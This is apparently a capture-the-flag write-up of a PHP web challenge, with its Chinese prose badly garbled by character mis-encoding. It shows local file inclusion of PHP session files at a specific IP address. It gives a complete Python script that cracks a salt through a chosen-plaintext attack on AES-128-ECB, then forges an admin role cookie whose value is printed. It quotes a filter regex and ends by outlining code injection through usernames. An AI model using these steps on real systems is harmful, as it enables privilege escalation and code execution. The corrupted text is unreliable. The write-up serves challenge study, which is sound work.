Êñá‰ª∂ÈáåÂÜôÊúâ‰∏Ä‰∫õÊúâÁâπÂÆöÊÑè‰πâÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÂÖ∂‰∏≠<code>&lt;PHPSESSID&gt;</code> ÂèØÂú®CookieÈáåÊâæÂà∞„ÄÇÂ∞ùËØïËØªÂèñSESSIONÊñá‰ª∂Ôºö</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//178.128.87.16/index.php?page=/var/lib/php/sessions/sess_8es749ivbfetvsmsc0ggthr2e5</span></span><br></pre></td></tr></table></figure><p><img src="1532088004024.png" alt="1532088004024"></p><p>ÂÖ∂‰∏≠ÊòØÂ∫èÂàóÂåñÂêéÁöÑ<code>$_SESSION</code> ÂíåÊòéÊñáÁöÑÊìç‰ΩúËÆ∞ÂΩïÔºåËøô‰∫õÂÜÖÂÆπÂú®ÂêéÈù¢‰ºöÂ§ßÊúâÁî®Â§Ñ„ÄÇ</p><h1 id="CPAÁåúËß£salt"><a href="#CPAÁåúËß£salt" class="headerlink" title="CPAÁåúËß£salt"></a>CPAÁåúËß£salt</h1><h2 id="login-php"><a href="#login-php" class="headerlink" title="login.php"></a>login.php</h2><p>ÈòÖËØª<code>login.php</code> Âπ∂Ë∑üÂÖ•Áõ∏ÂÖ≥Êñá‰ª∂ÔºåÂèØ‰ª•ÁúãÂà∞ÊúâÂ§öÂ§ÑÁî®Âà∞<code>$salt</code> ÂèòÈáèÔºåÂÖ∂Âú∞‰ΩçÈùûÂ∏∏ÂÖ≥ÈîÆ„ÄÇ</p><p>È¶ñÂÖàÊòØ‰ªéÂçïÁã¨ÁöÑË°®<code>mapl_config</code> ‰∏≠ËØªÂá∫ÂÄº„ÄÇ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    $configRow=config_connect($conn);</span><br><span class="line">    $salt=$configRow[<span class="string">'mapl_salt'</span>];</span><br><span class="line">    $key=$configRow[<span class="string">'mapl_key'</span>];</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    function config_connect($conn)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        $config=mysqli_query($conn,"SELECT * FROM mapl_config");</span></span><br><span class="line"><span class="comment">        return mysqli_fetch_array($config);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>Â¶ÇÊûúÁôªÈôÜÊàêÂäüÂ∞±Â∞ÜÁî®Êà∑ÂêçÂíåÈÇÆÁÆ±Âä†ÁõêÂä†ÂØÜÂ≠òÂÇ®ÁöÑ<code>$_SESSION</code> ÂèòÈáèÈáå„ÄÇÂπ∂‰∏îÂ∞Ü<code>admin</code> /<code>user</code> Â≠óÁ¨¶‰∏≤Âä†ÁõêÂä†ÂØÜÂ≠òÂÇ®Âú®<code>$_COOKIE[&#39;_role&#39;]</code> ÂèòÈáè‰∏≠ÔºåÁî®‰ª•Ê†áËØÜÁî®Êà∑Ë∫´‰ªΩ„ÄÇ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( $count === <span class="number">1</span> &amp;&amp; $row[<span class="string">'userPass'</span>]===$password ) <span class="comment">//ÁôªÈôÜÊàêÂäü</span></span><br><span class="line">&#123;</span><br><span class="line">$secure_email=encryptData($row[<span class="string">'userEmail'</span>],$salt,$key);</span><br><span class="line">$secure_name=encryptData($row[<span class="string">'userName'</span>],$salt,$key);</span><br><span class="line">$log_content=<span class="string">'['</span>.date(<span class="string">"h:i:sa"</span>).<span class="string">' GMT+7] Logged In'</span>;</span><br><span class="line">$_SESSION[<span class="string">'character_name'</span>] = $secure_name;</span><br><span class="line">$_SESSION[<span class="string">'user'</span>] = $secure_email;</span><br><span class="line">    $_SESSION[<span class="string">'action'</span>]=$log_content;</span><br><span class="line"><span class="keyword">if</span> ($row[<span class="string">'userIsAdmin'</span>]===<span class="string">'1'</span>)</span><br><span class="line">&#123;</span><br><span class="line">$data=<span class="string">'admin'</span>.$salt;</span><br><span class="line">$role=hash(<span class="string">'sha256'</span>, $data);</span><br><span class="line">setcookie(<span class="string">'_role'</span>,$role);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$data=<span class="string">'user'</span>.$salt;</span><br><span class="line">$role=hash(<span class="string">'sha256'</span>, $data);</span><br><span class="line">setcookie(<span class="string">'_role'</span>,$role);</span><br><span class="line">&#125;</span><br><span class="line">header(<span class="string">"Location: ?page=home.php"</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    function encryptData($data,$salt,$key)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">            $encrypt=openssl_encrypt($data.$salt,"AES-128-ECB",$key);</span></span><br><span class="line"><span class="comment">            $raw=base64_decode($encrypt);</span></span><br><span class="line"><span class="comment">            $final=implode(unpack("H*", $raw));</span></span><br><span class="line"><span class="comment">            return $final;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="setting-php"><a href="#setting-php" class="headerlink" title="setting.php"></a>setting.php</h2><p>ÂÜçÊü•Áúã<code>setting.php</code> ÔºåËøô‰∏™Êñá‰ª∂ÂÆûÁé∞‰∫Ü‰øÆÊîπÁî®Êà∑ÂêçÈ°µÈù¢ÁöÑÂäüËÉΩ „ÄÇÂè™Ë¶Å‰øÆÊîπÂêéÁöÑÂêçÂ≠ó‰∏çÈïø‰∫é22‰∏™Â≠óÁ¨¶ÔºåÂ∞±‰ΩøÁî®<code>mysqli_real_escape_string</code> Â§ÑÁêÜÂπ∂Êõ¥Êñ∞ËÆ∞ÂΩïÔºàÈÅøÂÖçSQLÊ≥®ÂÖ•Ôºâ„ÄÇ‰ºöË¢´ÁºñÁ†ÅÁöÑÂ≠óÁ¨¶ÊúâÁöÑ NULÔºàASCII 0Ôºâ„ÄÅ\n„ÄÅ\r„ÄÅ\„ÄÅ‚Äô„ÄÅ‚Äù Âíå Control-Z„ÄÇ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen($_POST[<span class="string">'name'</span>])&lt;=<span class="number">22</span>)&#123;</span><br><span class="line">    $name=mysqli_real_escape_string($conn,$_POST[<span class="string">'name'</span>]);</span><br><span class="line">    $query=<span class="string">"UPDATE users SET userName='$name' WHERE userEmail='$mail'"</span>;</span><br><span class="line">    $res2=mysqli_query($conn,$query);</span><br><span class="line">    $userRow2=mysqli_fetch_array($res2);</span><br><span class="line">    $secure_name=encryptData($name,$salt,$key);</span><br><span class="line">    $_SESSION[<span class="string">'character_name'</span>] = $secure_name;</span><br><span class="line">    $log_content=<span class="string">'['</span>.date(<span class="string">"h:i:sa"</span>).<span class="string">' GMT+7] Change character name'</span>;</span><br><span class="line">    $_SESSION[<span class="string">'action'</span>]=$log_content;</span><br><span class="line">    header(<span class="string">"Refresh:0"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊâÄÊúâÂä†ÂØÜÊìç‰ΩúÁî®ÁöÑÊòØÂêå‰∏Ä‰∏™<code>$salt</code> ÔºåÂä†‰∏ä‰∏äËø∞ÂåÖÂê´SessionÊñá‰ª∂ÁöÑÊìç‰ΩúÔºåÂ∞±‰ºöÊúâÊûÑÈÄ†‰ªªÊÑèÊòéÊñáËé∑ÂèñÂØπÂ∫îÂØÜÊñáÁöÑÂèØËÉΩ„ÄÇÊúÄÈáçË¶ÅÁöÑÔºåÂä†ÂØÜÊñπÂºèÈááÁî®‰∫Ü<code>AES-128-ECB</code> Ôºå<code>ECB</code> ÂÖ®Áß∞<code>Electronic Codebook</code> ÔºàÁîµÁ†ÅÊú¨ÔºâÔºåÈ°æÂêçÊÄù‰πâÔºåËøôÁßçÊ®°ÂºèÁöÑÁâπÁÇπÂ∞±ÊòØÁõ∏ÂêåÁöÑÊòéÊñáÂùóÂä†ÂØÜÂêé‰ºöÂæóÂà∞Áõ∏ÂêåÁöÑÂØÜÊñáÂùó„ÄÇ</p><p>ËøôÈáåÈááÁî®128‰ΩçÁöÑÂàÜÁªÑÂΩ¢ÂºèÔºå‰πüÂ∞±ÊòØÊØèÂçÅÂÖ≠Â≠óËäÇ‰∏Ä‰∏™ÊòéÊñáÂùó„ÄÇ‰∏æÊ†óËØ¥ÊòéÔºö</p><p>Â¶ÇÊûúÁî®Êà∑ÂêçÊòØ<code>findneo</code> ‰∏É‰∏™Â≠óËäÇÔºå<code>$salt</code> ÊòØ<code>xianzhi</code> ÂÖ´‰∏™Â≠óËäÇÔºåÈÇ£‰πàÂä†ÂØÜËøáÁ®ãÂ∞±ÊòØÊää<code>findneoxianzhi</code> ÂÖ±ÂçÅ‰∫î‰∏™Â≠óËäÇ‰Ωú‰∏∫‰∏Ä‰∏™ÂàÜÁªÑÂéªÂä†ÂØÜÔºåÁº∫‰∏Ä‰∏™Â≠óËäÇÊåâÁÆóÊ≥ïpadding„ÄÇ</p><p>Â¶ÇÊûúÁî®Êà∑ÂêçÊòØ<code>hifindneo</code> ÂÖ±‰πù‰∏™Â≠óËäÇÔºåÈÇ£‰πàÂä†ÂØÜËøáÁ®ãÂ∞±ÊòØÂØπ<code>hifindne</code> Âíå<code>oxianzhi</code> ‰Ωú‰∏∫‰∏§‰∏™ÂàÜÁªÑÂä†ÂØÜ„ÄÇ</p><p>Êàë‰ª¨ÂèØ‰ª•Âú®<code>SETTING</code> È°µÈù¢‰øÆÊîπÁî®Êà∑ÂêçÊù•ÊîπÂèòÊòéÊñáÔºåÁÑ∂Âêé‰ΩøÁî®Êñá‰ª∂ÂåÖÂê´ËØªÂà∞SessionÊñá‰ª∂ÂÜÖÂÆπÊù•Ëé∑ÂèñÂØÜÊñáÔºåËøôÂ∞±ÊòØ‰∏Ä‰∏™ÂÆåÊï¥ÁöÑÈÄâÊã©ÊòéÊñáÊîªÂáªËøáÁ®ã„ÄÇ</p><h2 id="Âà©Áî®"><a href="#Âà©Áî®" class="headerlink" title="Âà©Áî®"></a>Âà©Áî®</h2><p>ÊÄé‰πàÊîªÂáªÂë¢ÔºüÊØîÂ¶ÇÁî®Êà∑ÂêçÊòØ<code>findneo</code> ÔºåÔºàÊàë‰ª¨Ëøò‰∏çÁü•ÈÅì<code>$salt</code> ÊòØ<code>xianzhi</code> Ôºâ ÔºåÈÇ£‰πàÂä†ÂØÜÁöÑÁ¨¨‰∏Ä‰∏™ÊòéÊñáÂàÜÁªÑÊòØ<code>findneox</code> ÔºåËÆ∞ÂΩï‰∏ã<code>$_SESSION[&#39;character_name&#39;]</code> ÁöÑÂâç32‰∏™Â≠óËäÇÂçÅÂÖ≠ËøõÂà∂Êï∞Ôºå‰πüÂ∞±ÊòØÂØÜÊñáÁöÑÁ¨¨‰∏Ä‰∏™ÂàÜÁªÑ„ÄÇ</p><p>ÁÑ∂Âêé‰æùÊ¨°ÊîπÂèòÁî®Êà∑Âêç‰∏∫<code>findneoa</code> „ÄÅ<code>findneob</code> „ÄÅ.etcÔºåÂπ∂ËÆ∞ÂΩïÂØÜÊñáÁ¨¨‰∏Ä‰∏™ÂàÜÁªÑ„ÄÇÁõ¥Âà∞Áî®Êà∑Âêç‰∏∫<code>findneox</code> Êó∂ÂèëÁé∞ÂØÜÊñáÁ¨¨‰∏Ä‰∏™ÂàÜÁªÑ‰∏éÁî®Êà∑Âêç‰∏∫<code>findneo</code> Êó∂ÁöÑÁõ∏Âêå„ÄÇÊ†πÊçÆECBÊ®°ÂºèÁöÑÁâπÁÇπÔºåÂ∞±ËÉΩÁü•ÈÅì<code>$salt</code> ÁöÑÁ¨¨‰∏Ä‰∏™Â≠óËäÇ‰∏∫<code>x</code> Ôºå‰∫ãÂÆû‰∏ä‰πüÁ°ÆÂÆûÂ¶ÇÊ≠§„ÄÇ</p><p>ÊµãËØïÂèëÁé∞Áî®Êà∑ÂêçÈïø15‰∏™Â≠óÁ¨¶Êó∂Ôºå<code>$_SESSION[&#39;character_name&#39;]</code> Êúâ64Â≠óËäÇÂçÅÂÖ≠ËøõÂà∂Êï∞Ôºå‰πüÂ∞±ÊòØÂä†ÁõêÂä†ÂØÜÂêéÊòØ32‰∏™Â≠óÁ¨¶ÔºåÁî®Êà∑ÂêçÈïø‰∏∫16‰∏™Â≠óÁ¨¶Êó∂Ôºå<code>$_SESSION[&#39;character_name&#39;]</code> Êúâ96Â≠óËäÇÔºå‰πüÂ∞±Âä†ÁõêÂä†ÂØÜÂêéÊúâ48‰∏™Â≠óÁ¨¶„ÄÇËøôËØ¥Êòé<code>$salt</code> Èïø‰∏∫16‰∏™Â≠óËäÇ„ÄÇ</p><p>ÁÑ∂ÂêéÂ∞±ÂèØ‰ª•ÊåâÁÖß‰ª•‰∏äÂéüÁêÜÁåúËß£<code>$salt</code> Ôºå‰º™ÈÄ†<code>$_COOKIE[&#39;_role&#39;]</code> ÔºåÊàê‰∏∫ÁÆ°ÁêÜÂëò„ÄÇ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># by https://findneo.github.io/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">url = <span class="string">"http://178.128.87.16/"</span></span><br><span class="line">cookie = dict(</span><br><span class="line">    PHPSESSID=<span class="string">'t9p07a1qt2plbcqp8tpkib4794'</span>,</span><br><span class="line">    <span class="comment"># _role='8e1c59c3fdd69afbc97fcf4c960aa5c5e919e7087c07c91cf690add608236cbe'</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_sess</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.get(</span><br><span class="line">        url + <span class="string">"?page=/var/lib/php/sessions/sess_"</span> + cookie[<span class="string">'PHPSESSID'</span>],</span><br><span class="line">        cookies=cookie)</span><br><span class="line">    <span class="keyword">return</span> r.content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sess_character_name</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""read_sess():</span></span><br><span class="line"><span class="string">    character_name|s:64:"6269cb047bbbd0802cd7b882700591c6f6ace10234be4243997282e7c467e820";</span></span><br><span class="line"><span class="string">    user|s:64:"82f0cac5c0591592eaccfdac48f3e3656c264c7a73f97aeea603461254e3ac38";</span></span><br><span class="line"><span class="string">    action|s:40:"[12:04:21pm GMT+7] Change character name";</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    character_name = read_sess().split(<span class="string">';'</span>)[<span class="number">0</span>].split(<span class="string">":"</span>)[<span class="number">-1</span>][<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">return</span> character_name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span><span class="params">(character_name)</span>:</span></span><br><span class="line">    payload = dict(name=character_name, submit=<span class="string">'Edit'</span>)</span><br><span class="line">    r = requests.post(url + <span class="string">"?page=setting.php"</span>, cookies=cookie, data=payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">whoami</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.get(url + <span class="string">"?page=home.php"</span>, cookies=cookie)</span><br><span class="line">    s = BeautifulSoup(r.content, <span class="string">'lxml'</span>)</span><br><span class="line">    <span class="keyword">print</span> s.h2.get_text().split(<span class="string">'\n'</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_and_check</span><span class="params">(name)</span>:</span></span><br><span class="line">    change_name(name)</span><br><span class="line">    <span class="comment"># whoami()</span></span><br><span class="line">    <span class="keyword">return</span> get_sess_character_name()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_salt</span><span class="params">()</span>:</span></span><br><span class="line">    junk = <span class="string">'x'</span> * <span class="number">16</span></span><br><span class="line">    salt = <span class="string">''</span></span><br><span class="line">    s = <span class="string">'ms_g00d_0ld_g4m3'</span> + string.printable</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">        cmp = change_and_check(junk[:i])[:<span class="number">32</span>]</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            <span class="comment"># Â¶ÇÊûúi==0ÔºåÊó†Ê≥ï‰øÆÊîπÁî®Êà∑ÂêçÔºåÂÆûÈôÖ‰∏äsaltÂØπÂ∫îÁöÑÂ∞±ÊòØÁ¨¨‰∫å‰∏™ÂØÜÊñáÂùóÔºåÁõ¥Êé•ÂèñÂç≥ÂèØ</span></span><br><span class="line">            cmp = change_and_check(junk)[<span class="number">32</span>:<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> cmp == change_and_check(junk[:i] + salt + j)[:<span class="number">32</span>]:</span><br><span class="line">                salt += j</span><br><span class="line">                <span class="keyword">print</span> salt</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> salt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">salt = crack_salt()</span><br></pre></td></tr></table></figure><p>ÁàÜÁ†¥ÂæóÂà∞<code>$salt</code> ‰∏∫<code>ms_g00d_0ld_g4m3</code> ÔºåÁÑ∂ÂêéËÆ°ÁÆóÂá∫<code>admin</code> Áî®Êà∑ÁöÑCookie‰∏∫<code>hashlib.sha256(&#39;admin&#39; + salt).hexdigest()</code>   ‰πüÂ∞±ÊòØ<code>_role=&#39;a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054&#39;</code>„ÄÇ </p><p><img src="1532066767366.png" alt="1532066767366"></p><p>ÂèØ‰ΩøÁî®FiddlerÁöÑFiltersÂäüËÉΩËÆæÁΩÆËØ∑Ê±ÇÂ§¥‰∏∫<code>PHPSESSID=8es749ivbfetvsmsc0ggthr2e5; _role=8e1c59c3fdd69afbc97fcf4c960aa5c5e919e7087c07c91cf690add608236cbe</code> ÔºåÊùÉÈôê‰∏äÂçá‰∏∫ADMIN„ÄÇ</p><p><img src="1532072362986.png" alt="1532072362986"></p><h1 id="‰ª•Cookie‰∏∫Ë∑≥ÊùøÁöÑSessionÊñá‰ª∂ÂåÖÂê´"><a href="#‰ª•Cookie‰∏∫Ë∑≥ÊùøÁöÑSessionÊñá‰ª∂ÂåÖÂê´" class="headerlink" title="‰ª•Cookie‰∏∫Ë∑≥ÊùøÁöÑSessionÊñá‰ª∂ÂåÖÂê´"></a>‰ª•Cookie‰∏∫Ë∑≥ÊùøÁöÑSessionÊñá‰ª∂ÂåÖÂê´</h1><h2 id="admin-php"><a href="#admin-php" class="headerlink" title="admin.php"></a>admin.php</h2><p>Ê≥®ÊÑèÂà∞SessionÊñá‰ª∂‰∏≠ÊúâÈÉ®ÂàÜÊòéÊñá‰ø°ÊÅØÔºåËÆ∞ÂΩïÂÖ≥‰∫é‰∏ä‰∏ÄÊ¨°ÁöÑÊìç‰Ωú„ÄÇÊØè‰∏ÄÊ¨°Êìç‰ΩúÈÉΩ‰ºöËÆ∞ÂΩïÔºå‰ΩÜÂè™Êúâ<code>admin.php</code>  ‰∏≠ÂÜôÂÖ•ÁöÑÂÜÖÂÆπÂ≠òÂú®ÂèØÊéßÂèòÈáèÔºö</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>($_POST[<span class="string">'pet'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'pet'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'email'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'email'</span>]) )</span><br><span class="line">&#123;</span><br><span class="line">    $dir=<span class="string">'./upload/'</span>.md5($salt.$_POST[<span class="string">'email'</span>]).<span class="string">'/'</span>;</span><br><span class="line">    give_pet($dir,$_POST[<span class="string">'pet'</span>]);</span><br><span class="line">    <span class="keyword">if</span>(check_available_pet($_POST[<span class="string">'pet'</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $log_content=<span class="string">'['</span>.date(<span class="string">"h:i:sa"</span>).<span class="string">' GMT+7] gave '</span>.$_POST[<span class="string">'pet'</span>].<span class="string">' to player '</span>.search_name_by_mail($conn,$_POST[<span class="string">'email'</span>]);</span><br><span class="line">        $_SESSION[<span class="string">'action'</span>]=$log_content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÂÖ∂‰∏≠ÁöÑ<code>search_name_by_mail($conn,$_POST[&#39;email&#39;])</code> Ê≠£ÊòØÁî®Êà∑ÂêçÔºåËÄåËøôÊòØÂèØ‰øÆÊîπÁöÑ„ÄÇÊâÄ‰ª•Âè™Ë¶ÅÂú®<code>CHARACTER</code> È°µÈù¢ÊâßË°å‰∏ÄÊ¨°ÈÄÅÂÆ†Áâ©ÁªôÊüê‰∏™Áî®Êà∑ÁöÑÊìç‰ΩúÔºåSessionÊñá‰ª∂‰∏≠Â∞±‰ºöÂá∫Áé∞ËØ•Áî®Êà∑ÁöÑÁî®Êà∑Âêç„ÄÇËÄåÂ¶ÇÊûúÁî®Êà∑ÂêçÊòØPHP‰ª£Á†ÅÔºåÂ∞±‰ºöË¢´ÊâßË°å„ÄÇ</p><p>Áî®Êà∑Âêç‰øÆÊîπÊúâÂì™‰∫õÈôêÂà∂Ôºü</p><p>È¶ñÂÖàÊòØ<code>Êñá‰ª∂ÂåÖÂê´</code> Â∞èËäÇÊèêÂà∞ÁöÑÊâÄÊúâ<code>GET</code> Ôºå<code>POST</code> ÂèÇÊï∞ÈÉΩÂøÖÈ°ªÁªèËøáÁöÑÈªëÂêçÂçïËøáÊª§„ÄÇ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bad_words</span><span class="params">($value)</span></span>&#123;$too_bad=<span class="string">"/(fuck|bakayaro|ditme|bitch|caonima|idiot|bobo|tanga|pin|gago|tangina|\/\/|damn|noob|pro|nishigou|stupid|ass|\(.+\)|`.+`|vcl|cyka|dcm)/is"</span>;</span><br><span class="line">$value = preg_replace($too_bad, str_repeat(<span class="string">"*"</span>,<span class="number">3</span>) ,$value);</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># |\/\/|\(.+\)|`.+`| ÊØîËæÉÈáçË¶ÅÔºåÊÑèÂë≥ÁùÄ‰º™ÂçèËÆÆ„ÄÅÂáΩÊï∞„ÄÅshellÈÉΩ‰∏çËÉΩÁõ¥Êé•‰ΩøÁî®„ÄÇ</span></span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÊòØ<code>setting.php</code> Ôºà‰ª£Á†ÅËßÅ<code>CPAÁåúËß£salt</code> Â∞èËäÇÔºâ‰∏≠Ë¶ÅÊ±ÇÁöÑ‰∏çÂ§ß‰∫é22‰∏™Â≠óÁ¨¶„ÄÇ</p><h2 id="character-php"><a href="#character-php" class="headerlink" title="character.php"></a>character.php</h2><p>ÊâÄÊúâÂäüËÉΩ‰∏≠ÂîØ‰∏Ä‰∏Ä‰∏™Áõ¥Êé•ÂÜôÊñá‰ª∂ÁöÑÊìç‰ΩúÂú®Âíå<code>CHARACTER</code> È°µÈù¢ÔºåÂêåÊ†∑ÈúÄÁªèËøáÈªëÂêçÂçïËøáÊª§ÔºåÂπ∂‰∏îË¶ÅÊ±ÇÂ∞è‰∫é20‰∏™Â≠óÁ¨¶„ÄÇ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'command'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'command'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen($_POST[<span class="string">'command'</span>])&gt;=<span class="number">20</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;strong&gt;Too Long&lt;/strong&gt;&lt;/center&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        save_command($mail,$salt,$_POST[<span class="string">'command'</span>]);</span><br><span class="line">        header(<span class="string">"Refresh:0"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">function save_command($email,$salt,$data)&#123;</span></span><br><span class="line"><span class="comment">$dir='./upload/'.md5($salt.$email);</span></span><br><span class="line"><span class="comment">file_put_contents($dir.'/command.txt', $data);</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="Âà©Áî®-1"><a href="#Âà©Áî®-1" class="headerlink" title="Âà©Áî®"></a>Âà©Áî®</h2><h3 id="ÊÄùË∑Ø"><a href="#ÊÄùË∑Ø" class="headerlink" title="ÊÄùË∑Ø"></a>ÊÄùË∑Ø</h3><p>ÂÖ®Â±ÄÂÖ±Êúâ‰∏§Â§ÑÂèØ‰ª•‰øÆÊîπÊñá‰ª∂ÔºåÂèØ‰ª•‰øÆÊîπÁî®Êà∑Âêç‰ª•‰øÆÊîπSessionÊñá‰ª∂Ôºå‰πüÂèØÂú®<code>CHARACTER</code> È°µÈù¢‰øÆÊîπ<code>command.txt</code> 